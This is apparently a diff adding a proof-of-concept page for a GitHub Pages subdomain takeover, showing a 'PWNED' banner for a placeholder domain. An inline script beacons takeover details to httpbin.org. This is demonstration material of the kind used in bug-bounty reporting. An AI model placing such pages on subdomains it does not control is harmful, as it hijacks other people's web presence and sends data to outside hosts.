@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>subdomain.test.com → TAKEN OVER</title>
+  <style>body{background:black;color:lime;font-family:monospace;padding:50px}</style>
+</head>
+<body>
+  <h1>🎯 GITHUB PAGES TAKEOVER</h1>
+  <pre>
+  Target:     subdomain.test.com
+  Attacker:   githubUser.github.io
+  Status:     <span style="color:red">PWNED</span>
+  </pre>
+  <script>
+    fetch('https://httpbin.org/post', {
+      method: 'POST',
+      body: JSON.stringify({
+        domain: 'subdomain.test.com',
+        takeover: 'github-pages',
+        timestamp: new Date()
+      })
+    });
+  </script>
+</body>
+</html>
